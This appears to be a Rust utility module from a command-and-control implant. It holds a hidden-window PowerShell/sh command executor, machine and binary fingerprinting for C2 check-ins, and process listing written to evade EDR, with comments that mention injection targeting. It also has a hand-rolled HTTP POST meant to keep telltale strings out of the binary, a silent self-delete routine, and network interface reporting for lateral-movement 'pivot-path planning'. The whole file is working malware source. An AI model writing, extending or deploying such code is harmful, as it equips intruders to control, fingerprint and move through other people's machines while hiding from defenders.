// ./src/utils.rs
use uuid::Uuid;
use sha2::{Sha256, Digest};
use std::process::Command;

// ── Shell spawn helper — keeps Windows-only API entirely off Linux/macOS ────

/// Spawn a shell command as a child process.
/// On Windows: PowerShell with CREATE_NO_WINDOW so no console flashes up.
/// On everything else: sh -c.
#[cfg(target_os = "windows")]
fn spawn_shell(cmd: &str) -> std::io::Result<std::process::Child> {
    use std::os::windows::process::CommandExt;
    // CREATE_NO_WINDOW: tells Windows not to allocate a console window for this
    // child process. This is the correct and sufficient flag — do NOT add
    // DETACHED_PROCESS, which severs stdout/stderr pipe inheritance and causes
    // the child to produce no output even when Stdio::piped() is set.
    const CREATE_NO_WINDOW: u32 = 0x0800_0000;
    Command::new("powershell")
        .args(["-NoProfile", "-NonInteractive", "-WindowStyle", "Hidden", "-Command", cmd])
        .stdout(std::process::Stdio::piped())
        .stderr(std::process::Stdio::piped())
        .creation_flags(CREATE_NO_WINDOW)
        .spawn()
}

#[cfg(not(target_os = "windows"))]
fn spawn_shell(cmd: &str) -> std::io::Result<std::process::Child> {
    Command::new("sh")
        .args(["-c", cmd])
        .stdout(std::process::Stdio::piped())
        .stderr(std::process::Stdio::piped())
        .spawn()
}

use tokio::io::{AsyncReadExt, AsyncWriteExt};
use crate::transport::C2Stream;

/// Read timeout for individual HTTP read operations (30 seconds).
const HTTP_READ_TIMEOUT: std::time::Duration = std::time::Duration::from_secs(30);

/// Overall deadline for the entire HTTP response (headers + body).
/// A Slowloris server that sends 1 byte every 29 seconds would reset
/// the per-read timeout indefinitely. This absolute deadline catches it.
const HTTP_TOTAL_DEADLINE: std::time::Duration = std::time::Duration::from_secs(120);

// Guard fs import so it is only used on Linux (prevents warning on Windows)
#[cfg(target_os = "linux")]
use std::fs;

/// Generates a persistent unique ID for the machine.
pub fn get_persistent_id() -> String {
    machine_uid::get().unwrap_or_else(|_| Uuid::new_v4().to_string())
}

/// Generates a unique ID for the specific executable binary.
/// This changes if the binary is recompiled or modified.
pub fn generate_exe_id(salt: &str) -> String {
    // Cache the ID so repeated calls always return the same value.
    // Without caching, if current_exe() or File::open fails intermittently
    // (EDR file locks, restrictive permissions), each call returns a fresh
    // UUID, creating thousands of orphaned "ghost" sessions on the C2.
    use std::sync::OnceLock;
    static CACHED_ID: OnceLock<String> = OnceLock::new();

    CACHED_ID.get_or_init(|| {
        let exe_path = match std::env::current_exe() {
            Ok(p) => p,
            Err(_) => {
                // Can't even get our path — use a deterministic ID from machine UID
                // instead of a random UUID that would change every check-in.
                return format!("fallback-{}", get_persistent_id());
            }
        };
        
        let file = match std::fs::File::open(&exe_path) {
            Ok(f) => f,
            Err(_) => {
                // File locked (EDR) — hash the path + salt for a stable ID
                let mut h = Sha256::new();
                h.update(salt.as_bytes());
                h.update(exe_path.to_string_lossy().as_bytes());
                let r = h.finalize();
                return Uuid::from_slice(&r[0..16]).unwrap_or_else(|_| Uuid::new_v4()).to_string();
            }
        };
        let mut reader = std::io::BufReader::with_capacity(64 * 1024, file);
        let mut hasher = Sha256::new();
        hasher.update(salt.as_bytes());
        let mut buf = [0u8; 65536];
        loop {
            let n = match std::io::Read::read(&mut reader, &mut buf) {
                Ok(0) => break,
                Ok(n) => n,
                Err(_) => {
                    // Read error mid-stream — hash what we have so far
                    break;
                }
            };
            hasher.update(&buf[..n]);
        }
        let result = hasher.finalize();
        Uuid::from_slice(&result[0..16]).unwrap_or_else(|_| Uuid::new_v4()).to_string()
    }).clone()
}

/// Executes a shell command based on the OS.
/// Returns (Stdout, Stderr, ExitCode)
pub fn execute_shell_command(cmd: &str) -> (String, String, i32) {
    execute_shell_command_timeout(cmd, std::time::Duration::from_secs(300))
}

/// Execute a shell command with a timeout. If the child process runs longer
/// than the timeout, it's killed. This prevents GUI apps (notepad.exe) or
/// long-running processes from permanently consuming a Tokio blocking thread
/// — doing this 512 times exhausts the blocking pool and freezes the agent.
pub fn execute_shell_command_timeout(cmd: &str, timeout: std::time::Duration) -> (String, String, i32) {
    let mut child = match spawn_shell(cmd) {
        Ok(c) => c,
        Err(e) => return (String::new(), e.to_string(), -1),
    };

    // Take ownership of pipes BEFORE the wait loop and drain them on
    // background threads via channels. Using channels instead of join()
    // lets us apply a timeout — if a grandchild process inherited the pipe
    // and keeps it open after the direct child exits, join() would block
    // indefinitely, hanging the agent's command handler.
    let stdout_pipe = child.stdout.take();
    let stderr_pipe = child.stderr.take();

    let (stdout_tx, stdout_rx) = std::sync::mpsc::channel::<String>();
    let (stderr_tx, stderr_rx) = std::sync::mpsc::channel::<String>();

    std::thread::spawn(move || {
        let mut buf = String::new();
        if let Some(mut pipe) = stdout_pipe {
            let _ = std::io::Read::read_to_string(&mut pipe, &mut buf);
        }
        let _ = stdout_tx.send(buf);
    });
    std::thread::spawn(move || {
        let mut buf = String::new();
        if let Some(mut pipe) = stderr_pipe {
            let _ = std::io::Read::read_to_string(&mut pipe, &mut buf);
        }
        let _ = stderr_tx.send(buf);
    });

    // Grace period for reader threads after child exits. If a grandchild
    // holds the pipe open, we don't wait forever — take what we have.
    const READER_GRACE: std::time::Duration = std::time::Duration::from_secs(3);

    let start = std::time::Instant::now();
    loop {
        match child.try_wait() {
            Ok(Some(status)) => {
                let stdout = stdout_rx.recv_timeout(READER_GRACE).unwrap_or_default();
                let stderr = stderr_rx.recv_timeout(READER_GRACE).unwrap_or_default();
                return (stdout.trim().to_string(), stderr.trim().to_string(), status.code().unwrap_or(-1));
            }
            Ok(None) => {
                if start.elapsed() > timeout {
                    let _ = child.kill();
                    let _ = child.wait();
                    let stdout = stdout_rx.recv_timeout(READER_GRACE).unwrap_or_default();
                    let stderr = stderr_rx.recv_timeout(READER_GRACE).unwrap_or_default();
                    let mut combined = stdout.trim().to_string();
                    if !combined.is_empty() { combined.push_str("\n\n"); }
                    combined.push_str(&format!(
                        "[Timed out after {}s — killed. Use 'bg <cmd>' for long-running tasks.]",
                        timeout.as_secs()
                    ));
                    return (combined, stderr.trim().to_string(), -1);
                }
                std::thread::sleep(std::time::Duration::from_millis(100));
            }
            Err(e) => return (String::new(), e.to_string(), -1),
        }
    }
}

/// Returns a list of processes in "PID|Name" format.
/// Used by the 'ps' extension and injection targeting.
pub fn get_process_list() -> String {
    let mut results = String::new();

    #[cfg(target_os = "linux")]
    {
        // Native /proc parsing for stealth (avoids spawning 'ps')
        if let Ok(entries) = fs::read_dir("/proc") {
            for entry in entries.flatten() {
                let path = entry.path();
                if path.is_dir() {
                    if let Some(file_name) = path.file_name() {
                        if let Some(name_str) = file_name.to_str() {
                            if name_str.chars().all(char::is_numeric) {
                                let comm_path = path.join("comm");
                                if let Ok(comm) = fs::read_to_string(comm_path) {
                                    results.push_str(&format!("{}|{}\n", name_str, comm.trim()));
                                }
                            }
                        }
                    }
                }
            }
        }
    }

    #[cfg(target_os = "windows")]
    {
        // Native process enumeration via CreateToolhelp32Snapshot.
        // Spawning tasklist.exe from an unbacked process is a well-known
        // EDR trigger — this avoids that entirely.
        use std::ffi::c_void;
        use std::mem;

        #[repr(C)]
        struct PROCESSENTRY32W {
            dw_size: u32,
            cnt_usage: u32,
            th32_process_id: u32,
            th32_default_heap_id: usize,
            th32_module_id: u32,
            cnt_threads: u32,
            th32_parent_process_id: u32,
            pc_pri_class_base: i32,
            dw_flags: u32,
            sz_exe_file: [u16; 260],
        }

        extern "system" {
            fn CreateToolhelp32Snapshot(dw_flags: u32, th32_process_id: u32) -> *mut c_void;
            fn Process32FirstW(h_snapshot: *mut c_void, lppe: *mut PROCESSENTRY32W) -> i32;
            fn Process32NextW(h_snapshot: *mut c_void, lppe: *mut PROCESSENTRY32W) -> i32;
            fn CloseHandle(h: *mut c_void) -> i32;
        }

        const TH32CS_SNAPPROCESS: u32 = 0x00000002;
        const INVALID_HANDLE: *mut c_void = -1isize as *mut c_void;

        unsafe {
            let snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
            if snap != INVALID_HANDLE && !snap.is_null() {
                let mut entry: PROCESSENTRY32W = mem::zeroed();
                entry.dw_size = mem::size_of::<PROCESSENTRY32W>() as u32;

                if Process32FirstW(snap, &mut entry) != 0 {
                    loop {
                        let name_len = entry.sz_exe_file.iter().position(|&c| c == 0).unwrap_or(260);
                        let name = String::from_utf16_lossy(&entry.sz_exe_file[..name_len]);
                        results.push_str(&format!("{}|{}\n", entry.th32_process_id, name));

                        if Process32NextW(snap, &mut entry) == 0 { break; }
                    }
                }
                CloseHandle(snap);
            }
        }
    }

    #[cfg(target_os = "macos")]
    {
        let output = Command::new("ps").args(["-eo", "pid,comm"]).output();
        if let Ok(o) = output {
             let stdout = String::from_utf8_lossy(&o.stdout);
             for line in stdout.lines().skip(1) {
                 let line = line.trim();
                 if let Some((pid, comm)) = line.split_once(' ') {
                      results.push_str(&format!("{}|{}\n", pid.trim(), comm.trim()));
                 }
             }
        }
    }

    if results.is_empty() {
        return "0|No processes found".to_string();
    }

    results
}

/// [NEW] Manual HTTP POST implementation using Async traits.
/// This allows us to remove the heavy `reqwest` dependency to reduce binary size
/// and eliminate unencrypted strings like "User-Agent" from the binary.
pub async fn manual_http_post(stream: &mut C2Stream, host: &str, path: &str, data: &[u8]) -> Result<Vec<u8>, String> {
    // Sanitize inputs: strip CRLF to prevent header injection / request smuggling
    let safe_host: String = host.chars().filter(|c| *c != '\r' && *c != '\n').collect();
    let safe_path: String = path.chars().filter(|c| *c != '\r' && *c != '\n').collect();

    let body_len = data.len();
    
    let request = format!(
        "POST {} HTTP/1.1\r\n\
         Host: {}\r\n\
         User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\n\
         Content-Type: application/json\r\n\
         Content-Length: {}\r\n\
         Connection: keep-alive\r\n\
         \r\n",
        safe_path, safe_host, body_len
    );

    // 2. Send Headers
    if let Err(e) = stream.write_all(request.as_bytes()).await {
        return Err(format!("Send headers failed: {}", e));
    }

    // 3. Send Body
    if let Err(e) = stream.write_all(data).await {
        return Err(format!("Send body failed: {}", e));
    }
    
    let _ = stream.flush().await;

    // 4. Read response: buffer headers + body with overflow tracking.
    // Per-read timeouts prevent hangs from dropped connections. An overall
    // deadline prevents Slowloris attacks where a tarpitting server sends
    // 1 byte every 29 seconds, resetting the per-read timeout indefinitely.
    let deadline = tokio::time::Instant::now() + HTTP_TOTAL_DEADLINE;
    let mut recv_buf = Vec::with_capacity(4096);
    let mut tmp = [0u8; 1024];
    let header_end: usize;

    // Phase 1: Read until we find \r\n\r\n
    loop {
        if tokio::time::Instant::now() > deadline {
            return Err("HTTP response exceeded total deadline".to_string());
        }
        // Use the sooner of per-read timeout and overall deadline
        let read_deadline = deadline.min(tokio::time::Instant::now() + HTTP_READ_TIMEOUT);
        match tokio::time::timeout_at(read_deadline, stream.read(&mut tmp)).await {
            Ok(Ok(0)) => return Err("EOF reading headers".to_string()),
            Ok(Ok(n)) => {
                recv_buf.extend_from_slice(&tmp[..n]);
                if recv_buf.len() > 16384 {
                    return Err("Response headers too large".to_string());
                }
                if let Some(pos) = recv_buf.windows(4).position(|w| w == b"\r\n\r\n") {
                    header_end = pos + 4;
                    break;
                }
            }
            Ok(Err(e)) => return Err(format!("Read failed: {}", e)),
            Err(_) => return Err("Timeout reading response headers".to_string()),
        }
    }

    // Split headers from any body bytes already in the buffer
    let header_str = String::from_utf8_lossy(&recv_buf[..header_end]).to_string();
    let mut body = recv_buf[header_end..].to_vec(); // body preamble (may be empty)

    // Parse Content-Length and Transfer-Encoding from response headers
    let content_len: Option<usize> = header_str.lines()
        .find(|l| l.to_lowercase().starts_with("content-length:"))
        .and_then(|l| l.split(':').nth(1))
        .and_then(|v| v.trim().parse::<usize>().ok());

    // Properly match the Transfer-Encoding header by checking the header name
    // starts with "transfer-encoding:" (case-insensitive). The old `.contains()`
    // approach would false-positive on headers like "X-Not-Transfer-Encoding: chunked".
    let is_chunked = header_str.lines()
        .any(|l| {
            let lower = l.to_lowercase();
            let trimmed = lower.trim_start();
            trimmed.starts_with("transfer-encoding:") && trimmed.contains("chunked")
        });

    const MAX_RESPONSE: usize = 10 * 1024 * 1024; // 10 MB hard limit

    if is_chunked {
        // Chunked transfer decoding with O(N) buffer management.
        // Instead of reallocating and copying the tail on every chunk
        // (which is O(N²) for many small chunks), we track a read cursor
        // and only compact when the consumed prefix exceeds half the buffer.
        let mut chunk_buf = body;
        let mut cursor: usize = 0; // read position in chunk_buf
        let mut decoded_body = Vec::new();

        loop {
            // Ensure we have a full chunk-size line from cursor onward
            while !chunk_buf[cursor..].windows(2).any(|w| w == b"\r\n") {
                let mut tmp2 = [0u8; 512];
                match tokio::time::timeout(HTTP_READ_TIMEOUT, stream.read(&mut tmp2)).await {
                    Ok(Ok(0)) => return Ok(decoded_body),
                    Ok(Ok(n)) => chunk_buf.extend_from_slice(&tmp2[..n]),
                    Ok(Err(e)) => return Err(format!("Read chunk size: {}", e)),
                    Err(_) => return Err("Timeout reading chunk size".to_string()),
                }
                if chunk_buf.len() - cursor > MAX_RESPONSE { return Err("Chunk buffer overflow".into()); }
            }

            let crlf_pos = match chunk_buf[cursor..].windows(2).position(|w| w == b"\r\n") {
                Some(pos) => cursor + pos,
                None => return Err("Chunked: expected CRLF but not found".into()),
            };
            let size_str = String::from_utf8_lossy(&chunk_buf[cursor..crlf_pos]).trim().to_string();
            cursor = crlf_pos + 2;

            let size_hex = size_str.split(';').next().unwrap_or("").trim();
            let chunk_size = match usize::from_str_radix(size_hex, 16) {
                Ok(n) => n,
                Err(_) => return Err(format!("Malformed chunk size: '{}'", size_str)),
            };
            if chunk_size == 0 { break; }
            if chunk_size > MAX_RESPONSE {
                return Err(format!("Single chunk size {} exceeds limit", chunk_size));
            }
            if decoded_body.len().checked_add(chunk_size).unwrap_or(usize::MAX) > MAX_RESPONSE {
                return Err(format!("Chunked response exceeds {} bytes", MAX_RESPONSE));
            }

            let need = chunk_size + 2; // data + \r\n
            while chunk_buf.len() - cursor < need {
                let mut tmp2 = [0u8; 4096];
                match tokio::time::timeout(HTTP_READ_TIMEOUT, stream.read(&mut tmp2)).await {
                    Ok(Ok(0)) => return Err("EOF in chunk data".into()),
                    Ok(Ok(n)) => chunk_buf.extend_from_slice(&tmp2[..n]),
                    Ok(Err(e)) => return Err(format!("Read chunk: {}", e)),
                    Err(_) => return Err("Timeout reading chunk data".to_string()),
                }
            }
            decoded_body.extend_from_slice(&chunk_buf[cursor..cursor + chunk_size]);
            cursor += need;

            // Compact: when the consumed prefix exceeds half the buffer,
            // drain it to reclaim memory without copying on every iteration.
            if cursor > chunk_buf.len() / 2 && cursor > 4096 {
                chunk_buf.drain(..cursor);
                cursor = 0;
            }
        }
        return Ok(decoded_body);
    }

    if let Some(len) = content_len {
        if len > MAX_RESPONSE {
            return Err(format!("Response too large: {} bytes", len));
        }
        // body already has preamble bytes; read the rest
        while body.len() < len {
            let mut tmp2 = [0u8; 4096];
            match tokio::time::timeout(HTTP_READ_TIMEOUT, stream.read(&mut tmp2)).await {
                Ok(Ok(0)) => break,
                Ok(Ok(n)) => body.extend_from_slice(&tmp2[..n]),
                Ok(Err(e)) => return Err(format!("Read body failed: {}", e)),
                Err(_) => return Err("Timeout reading response body".to_string()),
            }
        }
        body.truncate(len);
        Ok(body)
    } else {
        // No Content-Length and not chunked — read until EOF with a size limit
        loop {
            let mut tmp2 = [0u8; 4096];
            match tokio::time::timeout(HTTP_READ_TIMEOUT, stream.read(&mut tmp2)).await {
                Ok(Ok(0)) => break,
                Ok(Ok(n)) => {
                    if body.len() + n > MAX_RESPONSE {
                        return Err(format!("Response exceeds {} byte limit (no Content-Length)", MAX_RESPONSE));
                    }
                    body.extend_from_slice(&tmp2[..n]);
                }
                Ok(Err(e)) => return Err(format!("Read failed: {}", e)),
                Err(_) => break, // Timeout on EOF-based read = assume complete
            }
        }
        Ok(body)
    }
}

/// Self Destruct Mechanism
/// Securely removes the agent from the disk and exits.
pub fn self_destruct() -> ! {
    let current_exe = std::env::current_exe().unwrap_or_default();
    
    // No output — avoid leaking intent to process monitors
    #[cfg(target_os = "windows")]
    {
        // Windows: Spawn a detached PowerShell cleanup job
        // Windows locks the running binary, so we need a separate process to wait and delete.
        // SECURITY: Escape single quotes in the path to prevent injection.
        // A file named `agent'; calc; '.exe` would break out of the string
        // and execute arbitrary PowerShell commands. Doubling single quotes
        // ('') is PowerShell's escape mechanism inside single-quoted strings.
        let path = current_exe.to_string_lossy().replace('\'', "''");
        let cmd = format!("Start-Sleep -Seconds 3; Remove-Item -Path '{}' -Force", path);
        
        let _ = spawn_shell(&cmd);
    }

    #[cfg(not(target_os = "windows"))]
    {
        // Linux/Unix: We can simply unlink the file (inode) while it is running.
        let _ = std::fs::remove_file(current_exe);
    }

    // Hard Exit
    std::process::exit(0);
}

/// Strip ANSI escape sequences and dangerous control characters from text
/// before printing to the operator's terminal. Prevents terminal injection
/// attacks from hijacked agents.
pub fn strip_ansi(s: &str) -> String {
    let mut result = String::with_capacity(s.len());
    let mut chars = s.chars().peekable();
    while let Some(c) = chars.next() {
        if c == '\x1B' {
            // All branches below are guarded by `while let Some(&p) = chars.peek()`
            // or `if let Some(...)`, so incomplete escape sequences at the end of
            // the string are handled safely — the iterator simply exhausts.
            if let Some(&next) = chars.peek() {
                if next == '[' {
                    chars.next(); // consume '['
                    // CSI: consume until terminating byte (letter, @, ~)
                    while let Some(&p) = chars.peek() {
                        chars.next();
                        if p.is_ascii_alphabetic() || p == '@' || p == '~' { break; }
                    }
                } else if next == ']' {
                    chars.next(); // consume ']'
                    // OSC: consume until BEL (0x07) or ST (ESC \)
                    while let Some(&p) = chars.peek() {
                        chars.next();
                        if p == '\x07' { break; }
                        if p == '\x1B' {
                            if chars.peek() == Some(&'\\') { chars.next(); }
                            break;
                        }
                    }
                } else {
                    chars.next(); // single-char escape (e.g. ESC D, ESC M)
                }
            }
            // Lone ESC at end of string — consumed, nothing to do
        } else if c.is_control() && c != '\n' && c != '\r' && c != '\t' {
            continue;
        } else {
            result.push(c);
        }
    }
    result
}

// ── Network interface enumeration ─────────────────────────────────────────────
//
// Used by the agent to report its local network topology to the server at
// registration time.  The server scores these for pivot-path planning.
//
// Implementation:
//   Unix  — parses `ip -o addr show` (Linux) / `ifconfig -a` (macOS) output.
//            Both produce one address per line in a consistent format.
//   Windows — PowerShell Get-NetIPAddress | ConvertTo-Json.
//   Other   — returns empty list; topology simply won't rank that agent.

pub fn get_network_interfaces() -> Vec<crate::common::NetworkInterface> {
    #[cfg(target_os = "linux")]   { get_ifaces_linux() }
    #[cfg(target_os = "macos")]   { get_ifaces_macos() }
    #[cfg(target_os = "windows")] { get_ifaces_windows() }
    #[cfg(not(any(
        target_os = "linux",
        target_os = "macos",
        target_os = "windows"
    )))] { vec![] }
}

// ── Linux: ip -o addr show ───────────────────────────────────────────────────

#[cfg(target_os = "linux")]
fn get_ifaces_linux() -> Vec<crate::common::NetworkInterface> {
    use std::collections::HashMap;

    // `ip -o addr show` prints one address per line:
    //   2: eth0    inet 192.168.1.5/24 brd 192.168.1.255 scope global eth0
    //   2: eth0    inet6 fe80::1/64 scope link
    let (out, _, _) = execute_shell_command("ip -o addr show 2>/dev/null");

    // Collect addresses per interface name, then read flags from sysfs
    let mut map: HashMap<String, Vec<String>> = HashMap::new();
    for line in out.lines() {
        let cols: Vec<&str> = line.split_whitespace().collect();
        // cols[1] = name, cols[2] = inet/inet6, cols[3] = addr/prefix
        if cols.len() >= 4 && (cols[2] == "inet" || cols[2] == "inet6") {
            let name = cols[1].trim_end_matches(':').to_string();
            map.entry(name).or_default().push(cols[3].to_string());
        }
    }

    map.into_iter().map(|(name, addresses)| {
        let flags = read_linux_flags(&name);
        crate::common::NetworkInterface { name, addresses, flags }
    }).collect()
}

/// Read IFF_* flag names from /sys/class/net/<name>/flags (hex bitmask).
#[cfg(target_os = "linux")]
fn read_linux_flags(name: &str) -> Vec<String> {
    let path = format!("/sys/class/net/{}/flags", name);
    let raw  = std::fs::read_to_string(&path).unwrap_or_default();
    let hex  = raw.trim().trim_start_matches("0x");
    let bits = u32::from_str_radix(hex, 16).unwrap_or(0);

    // Standard Linux IFF_* bits (from <net/if.h>)
    const FLAGS: &[(u32, &str)] = &[
        (0x0001, "UP"),
        (0x0002, "BROADCAST"),
        (0x0008, "LOOPBACK"),
        (0x0010, "POINTTOPOINT"),
        (0x0040, "RUNNING"),
        (0x0100, "PROMISC"),
        (0x1000, "MULTICAST"),
    ];
    FLAGS.iter().filter(|(bit, _)| bits & bit != 0).map(|(_, n)| n.to_string()).collect()
}

// ── macOS: ifconfig -a ───────────────────────────────────────────────────────

#[cfg(target_os = "macos")]
fn get_ifaces_macos() -> Vec<crate::common::NetworkInterface> {
    use std::collections::HashMap;

    // ifconfig -a output:
    //   en0: flags=8863<UP,BROADCAST,SMART,RUNNING,SIMPLEX,MULTICAST> mtu 1500
    //       inet 192.168.1.5 netmask 0xffffff00 broadcast 192.168.1.255
    //       inet6 fe80::1%en0 prefixlen 64 scopeid 0x4
    let (out, _, _) = execute_shell_command("ifconfig -a 2>/dev/null");

    let mut map: HashMap<String, (Vec<String>, Vec<String>)> = HashMap::new();
    let mut current = String::new();

    for line in out.lines() {
        if !line.starts_with('\t') && !line.starts_with(' ') {
            // Interface header: "en0: flags=…"
            if let Some(colon) = line.find(':') {
                current = line[..colon].to_string();
                // Parse flag names from <…>
                let flags = parse_macos_flags(line);
                map.entry(current.clone()).or_default().1 = flags;
            }
        } else if !current.is_empty() {
            let trimmed = line.trim();
            if trimmed.starts_with("inet6 ") {
                let parts: Vec<&str> = trimmed.split_whitespace().collect();
                if parts.len() >= 4 {
                    let addr  = parts[1].split('%').next().unwrap_or(parts[1]);
                    let pfx   = parts[3];
                    map.entry(current.clone()).or_default().0
                       .push(format!("{}/{}", addr, pfx));
                }
            } else if trimmed.starts_with("inet ") {
                let parts: Vec<&str> = trimmed.split_whitespace().collect();
                if parts.len() >= 4 {
                    let addr = parts[1];
                    // netmask is hex: 0xffffff00 → 24 bits
                    let hex  = parts[3].trim_start_matches("0x");
                    let mask = u32::from_str_radix(hex, 16).unwrap_or(0);
                    let pfx  = mask.count_ones();
                    map.entry(current.clone()).or_default().0
                       .push(format!("{}/{}", addr, pfx));
                }
            }
        }
    }

    map.into_iter().map(|(name, (addresses, flags))| {
        crate::common::NetworkInterface { name, addresses, flags }
    }).collect()
}

#[cfg(target_os = "macos")]
fn parse_macos_flags(header: &str) -> Vec<String> {
    // Extract the angle-bracketed list:  flags=8863<UP,BROADCAST,RUNNING,…>
    if let (Some(a), Some(b)) = (header.find('<'), header.find('>')) {
        return header[a+1..b].split(',').map(|s| s.to_string()).collect();
    }
    vec![]
}

// ── Windows: Get-NetIPAddress ────────────────────────────────────────────────

#[cfg(target_os = "windows")]
fn get_ifaces_windows() -> Vec<crate::common::NetworkInterface> {
    use std::collections::HashMap;

    // PowerShell returns a JSON array of address objects
    let ps = "Get-NetIPAddress | Select-Object InterfaceAlias,IPAddress,PrefixLength | ConvertTo-Json -Compress";
    let (out, _, _) = execute_shell_command(ps);

    let mut map: HashMap<String, Vec<String>> = HashMap::new();
    if let Ok(val) = serde_json::from_str::<serde_json::Value>(out.trim()) {
        let arr = match &val {
            serde_json::Value::Array(a) => a.as_slice().to_vec(),
            obj => vec![obj.clone()],  // single object (only one address)
        };
        for item in arr {
            let name   = item["InterfaceAlias"].as_str().unwrap_or("unknown").to_string();
            let addr   = item["IPAddress"].as_str().unwrap_or("").to_string();
            let prefix = item["PrefixLength"].as_u64().unwrap_or(24);
            if !addr.is_empty() {
                map.entry(name).or_default().push(format!("{}/{}", addr, prefix));
            }
        }
    }

    map.into_iter().map(|(name, addresses)| {
        // Report UP+RUNNING for all Windows adapters (no easy bitmask without WinAPI)
        crate::common::NetworkInterface {
            name,
            addresses,
            flags: vec!["UP".to_string(), "RUNNING".to_string()],
        }
    }).collect()
}
